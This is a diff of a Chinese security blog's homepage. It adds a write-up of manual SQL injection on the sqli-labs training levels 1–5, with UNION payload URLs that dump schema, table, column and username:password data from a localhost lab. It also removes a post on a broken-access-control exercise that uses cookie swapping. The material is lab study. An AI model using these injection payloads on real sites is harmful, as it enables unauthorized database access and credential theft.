@@ -149,6 +149,139 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">sqli-labs实战记录之手工注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-06-19 16:38:50 / 修改时间：21:01:12" itemprop="dateCreated datePublished" datetime="2021-06-19T16:38:50+08:00">2021-06-19</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本着再多思考思考sql注入的目标，刷一遍sqli-labs。面试时遇到搜索型注入思维顺溜但是表达不顺溜，说明自己还是没有充分理解，无妨，那就来查漏补缺。</p>
+<h1 id="0x01-base"><a href="#0x01-base" class="headerlink" title="0x01 base"></a>0x01 base</h1><h2 id="less-1-字符型"><a href="#less-1-字符型" class="headerlink" title="less-1 字符型"></a>less-1 字符型</h2><p>别忘了<strong>？</strong>后面加参数id=1’</p>
+<p>and ‘1’ = ‘1正常，and ‘1’ = ‘2报错，说明是字符型</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/1.png"></p>
+<p>报错回显是limit 0,1，说明后台查询语句很有可能是SELECT * FROM users WHERE id=$id LIMIT 0,1，说明对用户的输入没有处理，直接带入数据库查询。</p>
+<p>字段数</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/3.png"></p>
+<p>数据库相关信息</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/4.png"></p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/5.png"></p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/6.png"></p>
+<p>数据库：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/7.png"></p>
+<p>表：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/8.png"></p>
+<p>列名：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/9.png"></p>
+<p>dump内容：<br><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/10.png"></p>
+<h2 id="less-2-数字型"><a href="#less-2-数字型" class="headerlink" title="less-2 数字型"></a>less-2 数字型</h2><p>数字型判断：</p>
+<p>and 1 =1正常，and 1=2错误(错误并不是报错，而是不返回信息)</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/15.png"></p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/16.png"></p>
+<p>字段数：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/11.png"></p>
+<p>查当前数据库：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/12.png"></p>
+<p>查所有数据库：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/17.png"></p>
+<p>查所有表：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/18.png"></p>
+<p>查users表中内容：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/13.png"></p>
+<p>对于用户名和密码看起来不方便，试试这样</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/14.png"></p>
+<h2 id="less-3-单引号-括号"><a href="#less-3-单引号-括号" class="headerlink" title="less-3 单引号+括号"></a>less-3 单引号+括号</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/23.png"></p>
+<p>报错信息**”1”) LIMIT 0,1‘<strong>表明开发者可能使用的SQL查询语句为</strong>SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1**,可知是**’)**闭合</p>
+<p>字段数：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/19.png"></p>
+<p>回显位置：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/20.png"></p>
+<p>猜库 表 列 表内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">数据库：</span><br><span class="line">http:&#x2F;&#x2F;localhost:81&#x2F;Less-3&#x2F;?id&#x3D;-1&#39; ) union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">表名：</span><br><span class="line">http:&#x2F;&#x2F;localhost:81&#x2F;Less-3&#x2F;?id&#x3D;-1&#39; ) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br><span class="line">列名</span><br><span class="line">http:&#x2F;&#x2F;localhost:81&#x2F;Less-3&#x2F;?id&#x3D;-1&#39; ) union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br><span class="line">表内容</span><br><span class="line">http:&#x2F;&#x2F;localhost:81&#x2F;Less-3&#x2F;?id&#x3D;-1&#39; ) union select 1,2,group_concat(username,&#39;:&#39;,password) from users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-4-双引号-括号"><a href="#less-4-双引号-括号" class="headerlink" title="less-4 双引号+括号"></a>less-4 双引号+括号</h2><p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/24.png"></p>
+<p>报错信息’1’’) LIMIT 0,1表明开发者可能使用的SQL查询语句为<strong>SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1</strong>,判断缺)闭合</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/21.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:81&#x2F;Less-4&#x2F;?id&#x3D;1&quot; ) union select 1,2,3--+</span><br><span class="line">...</span><br><span class="line">同上</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-5-盲注-单引号"><a href="#less-5-盲注-单引号" class="headerlink" title="less-5 盲注+单引号"></a>less-5 盲注+单引号</h2><p>如果查询的id在数据库当中，可以发现页面内显示“you are  in…“,如果不在则什么也不显示，判断为盲注</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/22.png"></p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/25.png"></p>
+<p>可以看到报错信息是**”1” LIMIT 0,1’**，后台代码可能是这样写的： <strong>SELECT * FROM users WHERE id=’$id’ LIMIT 0,1</strong> </p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/26.png"></p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/27.png"></p>
+<blockquote>
+<p>limit用法：</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/2.png"></p>
+</blockquote>
+<h2 id><a href="#" class="headerlink" title></a></h2>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -492,7 +625,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/05/28/VulnHub-GoldenEye/" class="post-title-link" itemprop="url">VulnHub-GoldenEye</a>
+            <a href="/2021/05/28/VulnHub-GoldenEye/" class="post-title-link" itemprop="url">VulnHub-GoldenEye:1 玩耍记录</a>
         </h2>
 
         <div class="post-meta">
@@ -509,7 +642,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-31 08:55:26" itemprop="dateModified" datetime="2021-05-31T08:55:26+08:00">2021-05-31</time>
+                <time title="修改时间：2021-06-19 10:43:39" itemprop="dateModified" datetime="2021-06-19T10:43:39+08:00">2021-06-19</time>
               </span>
 
           <br>
@@ -518,7 +651,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>104</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -537,7 +670,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>定个小目标，把50台vulhub整个玩一遍，探探其中奥秘。当然最终目标是获取root权限</p>
+<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
+<li>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></li>
+</ol>
+
       
     </div>
 
@@ -1664,119 +1801,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/22/Broken-Access-Contro/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/22/Broken-Access-Contro/" class="post-title-link" itemprop="url">越权访问BAC-Broken Access Contro</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-04-22 11:18:58" itemprop="dateCreated datePublished" datetime="2021-04-22T11:18:58+08:00">2021-04-22</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-29 16:46:21" itemprop="dateModified" datetime="2021-04-29T16:46:21+08:00">2021-04-29</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>本文将谈谈越权那些事儿。靶场也是本博客的传统–pikachu。</p>
-<h1 id="0x02-谈谈越权"><a href="#0x02-谈谈越权" class="headerlink" title="0x02 谈谈越权"></a>0x02 谈谈越权</h1><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。</p>
-<p>攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就易致越权漏洞。</p>
-<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果<strong>验证权限不足</strong>，便会导致越权</p>
-<p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
-<h2 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h2><p>主要分为水平越权和垂直越权</p>
-<p><img src="/2021/04/22/Broken-Access-Contro/6.jpg"></p>
-<h3 id="case1-隐藏-URL"><a href="#case1-隐藏-URL" class="headerlink" title="case1: 隐藏 URL"></a>case1: 隐藏 URL</h3><p>有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。</p>
-<p>解决:验证用户身份，验证用户是否具备操作数据的权限</p>
-<h3 id="case2-直接对象引用"><a href="#case2-直接对象引用" class="headerlink" title="case2: 直接对象引用"></a>case2: 直接对象引用</h3><p>通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。</p>
-<p>解决:直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理</p>
-<h3 id="case3-多阶段功能"><a href="#case3-多阶段功能" class="headerlink" title="case3: 多阶段功能"></a>case3: 多阶段功能</h3><p>多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p>
-<p>解决:执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限,特别敏感操作可以让用户再次输入密码或其他的验证信息。</p>
-<h3 id="case4-静态文件"><a href="#case4-静态文件" class="headerlink" title="case4: 静态文件"></a>case4: 静态文件</h3><p>网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。</p>
-<p>解决:加密静态文件命名规则，防止攻击者枚举;敏感数据特殊化处理</p>
-<h3 id="case5-平台配置错误"><a href="#case5-平台配置错误" class="headerlink" title="case5: 平台配置错误"></a>case5: 平台配置错误</h3><p>程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。</p>
-<p>解决:配置控件上点心儿吧</p>
-<h2 id="如何防止："><a href="#如何防止：" class="headerlink" title="如何防止："></a>如何防止：</h2><p>在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p>
-<h2 id="靶场练习："><a href="#靶场练习：" class="headerlink" title="靶场练习："></a>靶场练习：</h2><p>当我们以lucy身份登陆进系统时，可以看到username参数可控，当我们改成其他用户时，可以看到其他用户的个人信息。这属于水平越权。</p>
-<p><img src="/2021/04/22/Broken-Access-Contro/1.jpg"></p>
-<p><img src="/2021/04/22/Broken-Access-Contro/2.jpg"></p>
-<p>接下来看看垂直越权,由于后台处理数据的逻辑存在漏洞,对于发送的数据包并没有判断当前数据包的用户权限,所以存在越权漏洞,具体看代码:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span>=connect();</span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="comment">//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。</span></span><br><span class="line"><span class="keyword">if</span>(!check_op2_login(<span class="variable">$link</span>))&#123;</span><br><span class="line">    header(<span class="string">&quot;location:op2_login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="literal">null</span>)&#123;<span class="comment">//用户名密码必填</span></span><br><span class="line">        <span class="variable">$getdata</span>=escape(<span class="variable">$link</span>, <span class="variable">$_POST</span>);<span class="comment">//转义</span></span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;<span class="subst">&#123;$getdata[&#x27;username&#x27;]&#125;</span>&#x27;,md5(&#x27;<span class="subst">&#123;$getdata[&#x27;password&#x27;]&#125;</span>&#x27;),&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;address&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=execute(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">if</span>(mysqli_affected_rows(<span class="variable">$link</span>)==<span class="number">1</span>)&#123;<span class="comment">//判断是否插入</span></span><br><span class="line">            header(<span class="string">&quot;location:op2_admin.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;修改失败,请检查下数据库是不是还是活着的&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>先登录admin账户创建test1用户,此时抓包.并发送到repeater模块</p>
-<p>然后登陆普通用户pikachu,获取普通用户的cookie.</p>
-<p>用此cookie覆盖之前admin用户的cookie,重放数据包,发现用户swanQ成功创建.</p>
-<p><img src="/2021/04/22/Broken-Access-Contro/3.jpg"></p>
-<p><img src="/2021/04/22/Broken-Access-Contro/4.jpg"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这句话很有道理：</p>
-<p>水平越权相当于用别人的卡，而垂直越权相当于用低价购买奢侈品。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1842,7 +1870,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1851,7 +1879,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-count">48</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
